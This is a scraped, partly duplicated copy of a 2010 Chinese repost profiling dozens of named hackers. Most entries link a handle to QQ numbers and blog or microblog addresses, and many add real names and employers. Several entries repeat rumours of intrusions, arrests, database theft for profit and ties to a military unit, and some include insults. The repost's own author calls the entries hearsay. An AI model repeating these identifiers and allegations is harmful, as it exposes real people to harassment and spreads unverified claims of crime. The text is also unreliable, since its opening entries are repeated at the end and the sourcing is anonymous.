/>彭涛。就职于国内著名信息安全公司，启明星辰。是ISTO的创始人。对oracle,mysql等数据库已经php等脚本非常精通。有多年的开发维护测试等安全经验。著名的xp&#x2F;2k&#x2F;2k3完美克隆用户的程序就是他的杰作。<br /><br />majun<br />QQ:45539511<br />马俊。据说是个很能装的人。不过还是有点技术，另外还传说他是sunwear的徒弟。可能得到的真传0day有不少。那入侵网站就如鱼得水了。<br /><br />shadow<br />QQ:26727179<br />博客:<br />影子。渗透高手。perl等脚本方面的高手。<br /><br />xiaomi<br />QQ:5980740<br />小米。T00ls的创始人之一。人缘还是不错的。<br /><br />cnbird<br />QQ:441303228<br />博客:<a target=\"_blank\" href=\"http://blog.csdn.net/cnbird2008\" rel=\"noopener noreferrer\">http://blog.csdn.net/cnbi<br>rd2008</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/cnbird2008\" rel=\"noopener noreferrer\">http://t.qq.com/cnbird2008</a><br />如果大家经常看国内的黑客杂志肯定对这个不陌生。linux,windows全方面的渗透高手。有一定的入侵经验。<br /><br />hackest<br />QQ:297521327<br />博客:<a target=\"_blank\" href=\"http://www.hackest.cn/\" rel=\"noopener noreferrer\">http://www.hackest.cn/</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/hackest\" rel=\"noopener noreferrer\">http://t.qq.com/hackest</a><br />也是搞入侵渗透的。不久前一直在卖LMHASH,MD5的彩虹表。<br /><br />惘然<br />博客:<a target=\"_blank\" href=\"http://www.wangran.net/\" rel=\"noopener noreferrer\">http://www.wangran.net/</a><br />搞渗透的<br /><br />4ngel<br />博客:<a target=\"_blank\" href=\"http://www.sablog.net/blog/\" rel=\"noopener noreferrer\">http://www.sablog.net/blog/</a><br />sablog的作者。著名的安全天使站长，现在广为流行的几个WEBSHELL都是他写的，有些是从他大代码上改的。对WEBSHELL行业有着不可磨灭的贡献，也是早期很多PHP程序漏洞的发现者。<br /><br />xhacker<br />QQ:66680800<br />小叮当。据说当年入侵过绿盟，也是混迹于黑客圈很久的人了。搞渗透不错。<br /><br />冷漠<br />QQ:386817<br />博客:fhod<a target=\"_blank\" href=\"http://www.lengmo.net/\" rel=\"noopener noreferrer\">http://www.lengmo.net/</a><br />红狼联盟的创始人。目前好像跟着某前辈黑客做事。<br /><br />fhod<br />QQ:1988415<br />博客:<a target=\"_blank\" href=\"http://0day.kr/\" rel=\"noopener noreferrer\">http://0day.kr/</a><br />目前好像跟着EST的老大打工。在渗透入侵方面也是有一定经验的，曾经写过一些文章。后来还因为黑站被抓。<br /><br />冰sugar<br />博客:<a target=\"_blank\" href=\"http://sebug.cn/\" rel=\"noopener noreferrer\">http://sebug.cn/</a><br />朱巨源。写过入门级的文章。在X档案有过投稿。也写过书《黑客攻防实战入门》。对一般的渗透技术有一定了解。<br /><br />虫子<br />QQ:712663200<br />博客:<a target=\"_blank\" href=\"http://evilh4ck.blog.sohu.com/\" rel=\"noopener noreferrer\">http://evilh4ck.blog.sohu.com/</a><br />虫总据说是入侵过不少游戏官方网站。看来应该赚了些钱。此人对入侵攻击还是有很多了解的。<br /><br />amxking<br />博客:<a target=\"_blank\" href=\"http://amxking.bokee.com/\" rel=\"noopener noreferrer\">http://amxking.bokee.com</a><br />QQ:5711277<br />红狼的核心成员，也是天阳的管理。<br /><br />七剑<br />QQ:7259561<br />博客:<a target=\"_blank\" href=\"http://1v1.name/\" rel=\"noopener noreferrer\">http://1v1.name</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/qijian\" rel=\"noopener noreferrer\">http://t.qq.com/qijian</a><br />搞WEB脚本，数据库，渗透攻击的。<br /><br />啊D<br />QQ:9269563<br />网站:<a target=\"_blank\" href=\"http://www.d99net.net/\" rel=\"noopener noreferrer\">http://www.d99net.net/</a><br />入行时间不短了，写过一些比较出名的工具，如早期的啊D网络工具包和后来的啊D注入工具。从这些可以看出对注入，编程是有一定了解的。经验比较丰富，工具虽然有BUG但还算稳定。<br /><br />雨夜<br />QQ:9148357<br />博客:<br />混迹黑客全也有数年。技术凑合。曾经也开办过黑客网站。<br /><br />redbin<br />QQ:35475<br />网站:<a target=\"_blank\" href=\"http://www.vip8.org/\" rel=\"noopener noreferrer\">http://www.vip8.org/</a><br />红滨。校园黑客联盟站长。<br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p>2010新编中国顶级黑客圈内人物资料和QQ,微博以及博客详解文章作者：<br />信息来源：邪恶八进制信息安全团队(<a target=\"_blank\" href=\"http://www.eviloctal.com/\" rel=\"noopener noreferrer\">www.eviloctal.com</a>)<br />百晓生_民间杂志【民间交流 民间技术 民间文化 民间舆论】<br />我只是在写自己所想到的杂志 我只是菜鸟！<br /><br />主页博客相册|个人档案 |好友 <br />查看文章&amp;#160; &amp;#160; <br /><br />【转帖】2010新编中国顶级黑客圈内人物资料和QQ,微博以及博客详解<br />2010年10月06日 星期三 下午 08:06<br />强大的黑客，强大的资料，以后就跟着这榜单混了，呵呵！<br /><br />郑重声明：<br /><br />小心是网络捧杀，中国黑客威胁论，最近是多事之秋。<br /><br />小心是网络捧杀，中国黑客威胁论，最近是多事之秋。<br /><br />小心是网络捧杀，中国黑客威胁论，最近是多事之秋。<br /><br />！！！！！！！！！！！！！！！！！！！！！！<br /><br />——————————————————————————————————————————<br /><br />祝各位大牛国庆节快乐.<br /><br />本文足以轰动一下.各大网站编辑抓紧第一时间发布<br /><br />2010新编中国顶级黑客圈内人物资料和QQ,微博以及博客详解<br /><br />首先最主要注明的是：排名不分先后<br /><br />本名单第一部分罗列的黑客都是真正拥有技术和才能者。并非大多数人平时在电视中所看到的那些盗号或入侵网站的“黑客”，电视里报道的那些人只是黑客界最底 层的人。例如熊猫烧香的作者，其实技术并不高，在黑客圈中大多数人都只是把这个病毒当作一个玩具。而技术含量高超的病毒都是类似于29A发布的那种。<br /><br />本文作者自我介绍。毕业于哈尔滨工业大学，2001年出道黑客圈，曾在国内多个黑客论坛潜水多年。参加过2004年国内顶级黑客大会XCON（安全焦点峰 会）（PS:扯淡）。2003年就职过国际顶级搜索引擎公司GOOGLE，后因个人原因离职。在黑客界有一定人缘基础。所以本文有一定权威性。至于我是 谁，避免被人追杀还是不明说了。下面开始正文：<br />第一部分列举老牌黑客。中国黑客界早期技术很牛的人。都是真正的高手。现在大部分技术还是不减当年，数一数二，是普通人望尘莫及的。<br /><br />在下面这些人中很多人手握众多危害极大的未公开漏洞。就是圈内所称的0day。这类危害极大的0day一般在黑市上可以卖的数十万人民币。<br />本文原始发布地址: <a target=\"_blank\" href=\"https://docs.google.com/leaf?id=1rO9CxzojOO0Qho-VOIUpGjwfZhAqcuRWnVXAbluCk4I&amp;sort=name&amp;layout=list&amp;num=50\" rel=\"noopener noreferrer\">https://docs.google.com/leaf?id= ... out=list&amp;num=50</a><br />一切内容以上面博客原文为准<br />注：以下列举的黑客当然只是一部分，其实还有很多的前辈级黑客。只不过现在基本都告别技术行业了。下面的人物中大部分还在相关领域活动，所以优先列出了。<br /><br />sunwear<br />QQ:47347<br />微博: <a target=\"_blank\" href=\"http://t.qq.com/sunwe4r\" rel=\"noopener noreferrer\">http://t.qq.com/sunwe4r</a><br />博客: 好像不用了<br />日娃哥。EST核心成员。圈内皆知他手握很多未公开漏洞。渗透入侵和漏洞方面的高手，曾是编程内核牛人。曾经入侵过世界顶级黑客组织Metasploit，剑桥大学等众多高端机构。几年前的世界最顶级两大黑客大会defcon和blackhat都对他有过报道。<br /><br />刺 QQ:32750912<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/aullik5\" rel=\"noopener noreferrer\">http://t.qq.com/aullik5</a><br />博客:<br />刺哥，大风哥。身材瘦弱。是中国黑客圈内纯技术黑客组织幻影旅团创始人。中国顶级黑客之一。目前好像就职于淘宝公司网络安全部门。也是手握很多未公开漏洞 的人。很多影响力很大的0day都是出自幻影旅团。WebZine的发起人。并且发展过WIKI的系统。还曾远赴美国参加世界顶级黑客大会 blackhat。。<br /><br />dm<br />QQ:不详<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/zoeluk\" rel=\"noopener noreferrer\">http://t.qq.com/zoeluk</a><br />博客:<br />国内顶级地下黑客组织0x557核心成员。是漏洞挖掘，利用方面的高手。不用说，手里的漏洞也是多的可以批发了。目前就职于世界著名反病毒杀毒软件公司麦咖啡(刚刚被intel收购)。现在还写起了iphone,ipad下的安全软件。看来是个全能选手。<br /><br />flashsky<br />QQ:38062 &amp; 16202253<br />博客:<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/flash-sky\" rel=\"noopener noreferrer\">http://t.qq.com/flash-sky</a><br />方兴。闪空哥。国内著名黑客组织安全焦点核心成员。2003年WINDOWS历史上最严重安全漏洞细节全球首发者,数百个高危级安全漏洞发现者,历任启明 星辰,美国EEYE,美国微软特聘安全专家,美国微软BLUEHAT第一个中国演讲者,安全焦点成员,南京翰海源信息技术有限公司创始人和CEO。对漏洞 方面的研究是相当高深的。预祝公司发展顺利。<br /><br />tombkeeper<br />QQ:644909<br />博客:<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/tombkeeper\" rel=\"noopener noreferrer\">http://t.qq.com/tombkeeper</a><br />于某。传说中的tk教主。国内著名黑客组织安全焦点核心成员。就职于绿盟科技，俗称妇科圣手。对windows操作系统以及漏洞等方面的研究可以说是非常精通。而在安全焦点论坛，最近几年一直被人奉为TK教主。对于其他领域的科学也有着独到的见解。文笔思想也是很独特的。<br /><br />glacier<br />QQ:1973435<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/glacier\" rel=\"noopener noreferrer\">http://t.qq.com/glacier</a><br />黄鑫。冰河哥。黄总。同为国内著名的黑客组织安全焦点核心成员。深圳大成天下的创始人之一。是中国最早的远程控制木马&quot;冰河&quot;的作者，也是著名安全扫描工 具&quot;x-scan&quot;的作者。黑客编程方面的高手，对于网络协议，加密安全以及软件工程有很深的了解。女黑客wollf的老公。一个风趣幽默的人。从微博上 就可以看出来了。已经当父亲了，当然孩子不是木马，是一个帅哥。再此祝福一下。<br /><br />swan<br />QQ:不详<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/Swan557\" rel=\"noopener noreferrer\">http://t.qq.com/Swan557</a><br />0x557(SST)核心成员，对于linux,windows操作系统上的漏洞可谓了如指掌。<br /><br />goodwell<br />QQ:19558287<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/goodwell\" rel=\"noopener noreferrer\">http://t.qq.com/goodwell</a><br />龚蔚。安致信息技术有限公司。中国早起黑客组织绿色兵团创始人，是传说中的中国黑客教父。曾经接受过中央电视台的参访。是以为资深的魔兽世界玩家。<br /><br />xundi<br />QQ:518860<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/idnuxzhang\" rel=\"noopener noreferrer\">http://t.qq.com/idnuxzhang</a><br />张迅迪。国内早期的著名黑客组织安全焦点创始人。具体就不过多介绍了，因为不熟悉，哈哈。<br /><br />lion<br />QQ:21509<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/coollion\" rel=\"noopener noreferrer\">http://t.qq.com/coollion</a><br />林勇。中国红客联盟创始人。跟大多网民在网上所了解到的中国红客大联盟不同。这个才是真正的中国红客联盟。至于所谓的sharpwinner，我只能用一句文明用语敏感词来形容“SB”“草泥马”。现在对于技术不如当年，而且已经远离技术告别当初了。<br /><br />isno<br />QQ:1070681<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/isnoblah\" rel=\"noopener noreferrer\">http://t.qq.com/isnoblah</a><br />安全焦点核心成员之一。目前就职于北京中航嘉信公司。曾经写过很多漏洞溢出方面的分析利用文章（WEBDAV,IDQ,IDA等）。exploit也写过很多。现在较为低调。<br /><br />天行<br />QQ:911189<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/tian_xing\n\" rel=\"noopener noreferrer\">http://t.qq.com/tian_xing</a> 好像不怎么用<br />中国第一代黑客之一。在1999年曾经与发动对国外网站的攻击。网络刺客,网络卫兵是其代表作品。而他对溢出和漏洞利用也颇有研究，例如RPC漏洞利用程序。以及他写的后门都很好。<br /><br />quack<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/wulujia\" rel=\"noopener noreferrer\">http://t.qq.com/wulujia</a><br />吴鲁佳。深圳达成天下创始人。与中国木马之父黄鑫关系很好。安全焦点早期活跃之人，ID：quack。<br /><br />icbm<br />QQ:不详<br /><a target=\"_blank\" href=\"http://t.qq.com/icbmx2\" rel=\"noopener noreferrer\">http://t.qq.com/icbmx2</a> 基本不用<br />赵伟。知道创宇创始人之一。曾经就职于国内著名信息安全公司启明星辰积极防御实验室。对各操作系统以及第三方软件的漏洞有很深的了解，手下的未公开漏洞很多。包括基于web方面的一些独特漏洞。<br /><br />sowhat<br />QQ:不详<br /><a target=\"_blank\" href=\"http://t.qq.com/secsecsec\" rel=\"noopener noreferrer\">http://t.qq.com/secsecsec</a><br />薛峰。就职于某保密单位。曾赴美国参加过国际顶级黑客大会blackhat。手握很多未公开漏洞。好像今年中国顶级黑客盛会xcon上还抽奖中了一台PS3。<br /><br />vxk<br />QQ:86879759<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/cvcvxk\" rel=\"noopener noreferrer\">http://t.qq.com/cvcvxk</a><br />几年前活跃于国内著名病毒论坛CVC。是国内知名的病毒专家。对操作系统内核以及编程，逆向，破解非常精通。可谓程序全能专家。<br /><br />refdom<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/refdom\" rel=\"noopener noreferrer\">http://t.qq.com/refdom</a><br />安全焦点核心成员之一。曾经是中国红客联盟的一员。<br /><br />watercloud<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/watercloud\" rel=\"noopener noreferrer\">http://t.qq.com/watercloud</a><br />知道创宇公司创始人之一。与icbm关系甚好。安全焦点核心成员之一。对漏洞，加密解密等方面有者多年的研究经验，网络安全趋势与发展有着独到的见解。最主要的还是对漏洞，0day方面，手握0day数量也很客观。<br /><br />alert7<br />QQ:415451<br />博客:<br />安全焦点核心成员之一。曾经就职与著名杀毒软件MCAFEE。目前就职于南京翰海源(Flashsky的公司)。对linux 方面的研究经验长达10年以上。对于linux等开源系统漏洞溢出分析利用了如指掌。<br /><br />袁哥<br />博客:<br />传说中的袁哥。没错，中国所有圈内顶级黑客无不佩服的人。就只与绿盟科技。袁哥在数学，编程，漏洞等诸多方面的造诣是无人可以比拟的。很多漏洞要早其它人数年之久就已经发现并且完美利用了。堪称漏洞方面的其人。黑客界的顶级高手。<br /><br />sunx<br />QQ:239670<br />孙华。国内非常著名的黑客编程高手，对漏洞溢出与利用和有研究，写过EXPLOIT。例如IDA漏洞和printer。在9X年代用汇编写过病毒。并且还编写过操作系统后门程序。<br /><br />funnywei<br />QQ:25044885<br />魏强。F博士。安全焦点核心成员之一。漏洞挖掘，漏洞利用方面的高手，在历届国内顶级黑客盛会XCON上都能见到他的身影。据传就职于中国人民解放军XXX部。为中国人民解放军提供很多未公开漏洞。<br /><br />小榕<br />中国早期著名黑客软件“流光”“逆雪”“乱刀”“黑客字典生成器”“ARPSNIFFER”“命令行注入工具”等黑客软件作者。目前对于漏洞方面等技术不如以上几人。不过对于中国黑客界的贡献还是不可小觑的。<br /><br />xikug<br />QQ:53564797<br />国内著名内核，漏洞，程序研究站debugman的站长。逆向，破解，加密，解密，内核等方面的高人。<br /><br />baoz<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/perlish\" rel=\"noopener noreferrer\">http://t.qq.com/perlish</a><br />方勇。包子。fatb。多年前就活跃于中国黑客界。活跃程度和人缘还是不错的。目前就职与迅雷公司。有大牛曾说是个带眼镜的胖子。为人厚道，皮肤较黑。<br /><br />wzt<br />QQ:71579912<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/wztjlh\" rel=\"noopener noreferrer\">http://t.qq.com/wztjlh</a><br />曾经的中国红客联盟核心成员。对于linux内核，以及linux漏洞方面颇有研究。<br /><br />czy<br />QQ:484323<br />四川的一个著名黑客，比较低调，但地下交流圈子中交流频繁。手握很多0day的高手。<br /><br />zzzevazzz<br />QQ:49322630<br />博客:<a target=\"_blank\" href=\"http://zzzevazzz.bokee.com/\" rel=\"noopener noreferrer\">http://zzzevazzz.bokee.com/</a><br />国内著名黑客组织幻影旅团核心成员。早期混迹于灰色轨迹。曾经著名的do all in cmdshell  作者。曾经在安全焦点普及ntsd知识，红极一时。对于windows内核以及漏洞方面有着深入的了解和经验。曾经写过很多有利于大众的文章，分享过很多 宝贵的经验。<br /><br />vessial<br />QQ:不详<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/vessial\" rel=\"noopener noreferrer\">http://t.qq.com/vessial</a><br />同dm一样就职于国际顶级杀毒软件安全厂商麦咖啡公司。也是一位对于漏洞等方面有诸多经验的高手。<br /><br />bkbll<br />qq:78384349<br />dumplogon。BK哥。中国红客联盟核心成员之一。2001年中美黑客大战时期技术还是初级的，但也算早期了。后来对溢出，漏洞以及逆向分析方面颇有研究，技术不错。是lion的好朋友。<br /><br />killer<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/dongzhiqiang\" rel=\"noopener noreferrer\">http://t.qq.com/dongzhiqiang</a><br />博客:<br />董志强。安全焦点核心成员之一。曾经就只与启明星辰公司。对于病毒与防病毒，逆向工程与破解等方面有多年的研究经验。目前为著名安全产品超级巡警的BOSS。<br /><br />coolq<br />qq:49462335<br />就职于绿盟科技的linux方面高手。在绿盟期刊上曾发有著作。对于开源系统有着多年的应用开发经验。linux,unix,bsd内核方面以及漏洞挖掘，利用方面也有着多年的经验。<br /><br />pjf<br />qq:85863144<br />博客:<a target=\"_blank\" href=\"http://pjf.blogcn.com/\" rel=\"noopener noreferrer\">http://pjf.blogcn.com/</a><br />国内著名antirootkit工具icesword的作者。是内核方面的专家。国内著名安全软件公司奇虎360公司的核心开发人员。<br /><br />lcx<br />海洋顶端网站长，是国内渗透入侵方面的高手，有着多年的入侵经验。是中国网马教父之一。安全手册的顾问。<br /><br />村长<br />QQ:6021240<br />国内顶级黑客组织0x557(SST)创始人。是国内著名信息安全公司启明星辰积极防御实验室的BOSS。对windows,linux非常了解，拥有多年的漏洞挖掘，利用的经验。<br /><br />casper<br />QQ:843525<br />华永兴安BOSS。国内顶级黑客大会xcon的主办方，也是安全焦点创始人之一。中国黑客界的老前辈。目前已经脱离技术领域，向老板发展了。<br /><br />e4gle<br />QQ:1949479<br />国内著名黑客组织WSS核心成员。老一代的黑客。对linux,unix下的溢出漏洞分析以及利用有着多年的研究经验，并且对病毒也很了解。<br />——————–华丽的分割线———————-<br /><br />下面将列举一些新生力量，虽然是新生，但起码都是3-6年前左右就开始活跃的人，所以还算是中生代黑客。<br /><br />mj0011<br />QQ:保密，避免骂他的人太多。<br />博客:<br />就职于国内著名安全公司奇虎360。为核心工程师。圈内敌人无数，只因口无遮拦，相貌丑陋等缺点所导致。对瑞星，金山等公司曾经常出言讽刺，另外连国际顶 级安全厂商赛门铁克也不放过。可谓毒舌娘子，连我也被骂过好几次。话说回来，对于编程，内核，木马，远控方面的技术还是不可否定的。<br /><br />baiyuanfan<br />QQ:51449276<br />曾经著名的后门程序BYSHELL的作者。曾经在某界安全焦点峰会上有过演讲议题，技术还是不错的。<br /><br />zwell<br />QQ:27592430<br />网站:<a target=\"_blank\" href=\"http:/\n/www.nosec.org/\" rel=\"noopener noreferrer\">http://www.nosec.org</a><br />白远方。曾经NB联盟核心成员。现在为诺塞科技的老大。诺塞科技的产品现在也广为圈内所知，例如穿山甲，JSKY等工具。对编程和注入WEB方面的东西也是很精通的。<br /><br />sudami<br />qq:527463097<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/sudami\" rel=\"noopener noreferrer\">http://t.qq.com/sudami</a><br />博客:<br />目前就职于国内著名杀毒软件安全软件厂商奇虎360公司。是后起的windows编程，内核之秀。对渗透攻击，入侵方面技术基本为零。曾在邪恶八进制，DEBUGMAN等论坛发表过多篇原创文章。对技术很有追求，进步很快的一个牛人。<br /><br />oldjun<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/seuhacker\" rel=\"noopener noreferrer\">http://t.qq.com/seuhacker</a><br />博客:<a target=\"_blank\" href=\"http://www.oldjun.com/\" rel=\"noopener noreferrer\">http://www.oldjun.com/</a><br />QQ:34680304<br />t00ls核心成员。asp,php等WEB脚本方面的高手，对于渗透入侵，WEB渗透相当精通。<br /><br />9xiao<br />博客: &amp; <a target=\"_blank\" href=\"http://www.9xiao.net/\" rel=\"noopener noreferrer\">www.9xiao.net</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/deioncube\" rel=\"noopener noreferrer\">http://t.qq.com/deioncube</a><br />t00ls核心成员，原火狐联盟的人。<br /><br />aono<br />QQ:13335589<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/air-storm\" rel=\"noopener noreferrer\">http://t.qq.com/air-storm</a><br />t00ls核心成员。无线安全方面的高手。在无线网络安方面有其独特的技术思想和经验。<br /><br />云舒<br />QQ:21287305<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/yunshuy\" rel=\"noopener noreferrer\">http://t.qq.com/yunshuy</a><br />是幻影旅团的核心成员之一，目前同axis一同就职于淘宝公司。其实也算的上是一位比较有资历的老人了。应该位列在上面。写过synflood方面代码。<br /><br />明小子<br />QQ:830540<br />网站:<a target=\"_blank\" href=\"http://www.hackdiy.com/\" rel=\"noopener noreferrer\">http://www.hackdiy.com/</a><br />黑客动画吧的人。著名的明小子旁注工具domain的作者。相比很多菜鸟都以及享受过这个工具的实惠了。其实技术只能说是一般。不过入行也不久了。注入脚本以及简易的编程还是不错的。<br /><br />鬼仔<br />QQ:359421<br />博客:<a target=\"_blank\" href=\"http://huaidan.org/\" rel=\"noopener noreferrer\">http://huaidan.org</a><br />目前就职于新浪公司。WEB应用安全方面的高手。<br /><br />lake2<br />QQ:<a target=\"_blank\" href=\"http://t.qq.com/mrhupo\" rel=\"noopener noreferrer\">http://t.qq.com/mrhupo</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/mrhupo\" rel=\"noopener noreferrer\">http://t.qq.com/mrhupo</a><br />脚本，数据库，渗透方面的高手。目前就职于腾讯QQ公司。<br /><br />neeao<br />QQ:35789112<br />WEB应用安全及脚本方面的高手。<br /><br />u#0h4x0r<br />博客:<a target=\"_blank\" href=\"http://www.noahacker.com/\" rel=\"noopener noreferrer\">http://www.noahacker.com/</a><br />QQ:645041992<br />对JAVA有一定了解，对渗透也有一些研究。入侵过不少无辜网站。<br /><br />hmily<br />qq:68857640<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/Hmily_LCG\" rel=\"noopener noreferrer\">http://t.qq.com/Hmily_LCG</a><br />博客:<br />吾爱破解的BOSS。是程序破解，软件破解，加密解密，逆向工程方面的高手。破解过很多大家常用的工具，如穿山甲。<br /><br />xi4oyu<br />博客:<a target=\"_blank\" href=\"http://www.pentestday.com/\" rel=\"noopener noreferrer\">http://www.pentestday.com/</a> &amp; <br />微博:<a target=\"_blank\" href=\"http://t.qq.com/evil_xi4oyu\" rel=\"noopener noreferrer\">http://t.qq.com/evil_xi4oyu</a><br />qq:909473606<br />linux方面的高手。<br /><br />猪猪<br />QQ:82648 &amp; 100298<br />岁月联盟站长。入行也有几年了。曾经参加过爱国反击黑客战。也入侵过不少圈内的同行网站。对ASP，注入方面比较了解。<br /><br />rayh4c<br />qq:30039780<br />博客:<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/rayh4c\" rel=\"noopener noreferrer\">http://t.qq.com/rayh4c</a><br />茄子宝。80SEC核心成员。对xss，CSRF等脚本漏洞非常精通。经验丰富。<br /><br />superhei<br />QQ:123230273<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/hi_heige\" rel=\"noopener noreferrer\">http://t.qq.com/hi_heige</a><br />幻影旅团核心成员。曾经写过著名的php注入漏洞利用工具。发现过很多国内流行的php程序漏洞。是WEB脚本，数据库方面的专家。<br /><br />ring04h<br />QQ:153520368<br />博客:<br />EST核心成员。与国内顶级黑客sunwear关系甚好。曾一同入侵过国内最著名的两大PHP论坛。此人对php，数据库等方面相当精通。<br /><br />冰血封情<br />QQ:310926<br />博客:<a target=\"_blank\" href=\"http://weblog.eviloctal.com/\" rel=\"noopener noreferrer\">http://weblog.eviloctal.com/</a><br />EST创始人。传说中的中国第四代黑客。据传说已经自己开公司，很久不做技术了。<br /><br />冰的原点<br />QQ:519249638<br />博客:<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/icezone\" rel=\"noopener noreferrer\">http://t.qq.com/icezone</a><br />黑客手册常见的人。是入门级黑客书籍《黑客渗透笔记》的原作者。对于初学者来说还是有一定学习价值的。<br /><br />friddy<br />博客:<a target=\"_blank\" href=\"http://www.friddy.cn/\" rel=\"noopener noreferrer\">http://www.friddy.cn</a><br />QQ:568623<br />专门搞漏洞挖掘的人，虽然技术上跟最上面的那些大牛级黑客比差一些，但相对来说还是不错的。另外也对入侵检测有所研究。<br /><br />余弦<br />qq:331861985<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/evilcos\" rel=\"noopener noreferrer\">http://t.qq.com/evilcos</a><br />xeye成员。目前就职于icbm的知道创宇公司，是web，脚本等方面的高手。<br /><br />教主<br />QQ:130138438<br />网站:<a target=\"_blank\" href=\"http://www.jiaozhu.org/\" rel=\"noopener noreferrer\">www.jiaozhu.org</a><br />圈内名气还算比较大的，主要还是因为他刷库赚钱很多。并且赔的也比较快。呵呵。技术不怎么样，但很能买很能卖。<br /><br />剑心<br />QQ:369458956<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/nullnull\" rel=\"noopener noreferrer\">http://t.qq.com/nullnull</a><br />方小顿。80sec站长。目前就职于百度公司，曾经跟百度公司老板李彦宏一起参加过芒果台的娱乐节目，一曲成名。不久前因为发布nginx的漏洞而又一次成名，是WEB安全，应用安全方面的高手。<br /><br />陆羽<br />QQ:170093007<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/T00ls_Luyu\" rel=\"noopener noreferrer\">http://t.qq.com/T00ls_Luyu</a><br />博客:<a target=\"_blank\" href=\"http://www.5luyu.cn/\" rel=\"noopener noreferrer\">http://www.5luyu.cn</a><br />t00ls核心成员，曾经编写过不少注入，旁注方面的辅助入侵工具，例如t00ls内部旁注工具，GETWEBSHELL等等。目前就职于奇虎360公司。<br /><br />爱无言<br />QQ:348450419<br />EST核心成员。对于漏洞挖掘，溢出利用，网络脚本安全方面有着多年经验。在国内著名黑客杂志黑客防线上发表过上百篇的文章。<br /><br />樱花浪子<br />QQ:305446947<br />博客:<a target=\"_blank\" href=\"http://www.hacklu.net/\" rel=\"noopener noreferrer\">http://www.hacklu.net/</a><br />SQL注入，WEB应用渗透技术还行。在一些黑客杂志上有过一些技术类文章。<br /><br />h4k_b4n<br />QQ:616222<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/h4k_b4n\" rel=\"noopener noreferrer\">http://t.qq.com/h4k_b4n</a><br />BCT核心成员。是WEB安全，脚本，数据库安全方面的高手，曾经发现过很多著名程序的漏洞。<br /><br />pt007<br />QQ:7491805<br />彭涛。就职于国内著名信息安全公司，启明星辰。是ISTO的创始人。对oracle,mysql等数据库已经php等脚本非常精通。有多年的开发维护测试等安全经验。著名的xp&#x2F;2k&#x2F;2k3完美克隆用户的程序就是他的杰作。<br /><br />majun<br />QQ:45539511<br />马俊。据说是个很能装的人。不过还是有点技术，另外还传说他是sunwear的徒弟。可能得到的真传0day有不少。那入侵网站就如鱼得水了。<br /><br />shadow<br />QQ:26727179<br />博客:<br />影子。渗透高手。perl等脚本方面的高手。<br /><br />xiaomi<br />QQ:5980740<br />小米。T00ls的创始人之一。人缘还是不错的。<br /><br />cnbird<br />QQ:441303228<br />博客:<a target=\"_blank\" href=\"http://blog.csdn.net/cnbird2008\" rel=\"noopener noreferrer\">http://blog.csdn.net/cnbi<br>rd2008</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/cnbird2008\" rel=\"noopener noreferrer\">http://t.qq.com/cnbird2008</a><br />如果大家经常看国内的黑客杂志肯定对这个不陌生。linux,windows全方面的渗透高手。有一定的入侵经验。<br /><br />hackest<br />QQ:297521327<br />博客:<a target=\"_blank\" href=\"http://www.hackest.cn/\" rel=\"noopener noreferrer\">http://www.hackest.cn/</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/hackest\" rel=\"noopener noreferrer\">http://t.qq.com/hackest</a><br />也是搞入侵渗透的。不久前一直在卖LMHASH,MD5的彩虹表。<br /><br />惘然<br />博客:<a target=\"_blank\" href=\"http://www.wangran.net/\" rel=\"noopener noreferrer\">http://www.wangran.net/</a><br />搞渗透的<br /><br />4ngel<br />博客:<a target=\"_blank\" href=\"http://www.sablog.net/blog/\" rel=\"noopener noreferrer\">http://www.sablog.net/blog/</a><br />sablog的作者。著名的安全天使站长，现在广为流行的几个WEBSHELL都是他写的，有些是从他大代码上改的。对WEBSHELL行业有着不可磨灭的贡献，也是早期很多PHP程序漏洞的发现者。<br /><br />xhacker<br />QQ:66680800<br />小叮当。据说当年入侵过绿盟，也是混迹于黑客圈很久的人了。搞渗透不错。<br /><br />冷漠<br />QQ:386817<br />博客:fhod<a target=\"_blank\" href=\"http://www.lengmo.net/\" rel=\"noopener noreferrer\">http://www.lengmo.net/</a><br />红狼联盟的创始人。目前好像跟着某前辈黑客做事。<br /><br />fhod<br />QQ:1988415<br />博客:<a target=\"_blank\" href=\"http://0day.kr/\" rel=\"noopener noreferrer\">http://0day.kr/</a><br />目前好像跟着EST的老大打工。在渗透入侵方面也是有一定经验的，曾经写过一些文章。后来还因为黑站被抓。<br /><br />冰sugar<br />博客:<a target=\"_blank\" href=\"http://sebug.cn/\" rel=\"noopener noreferrer\">http://sebug.cn/</a><br 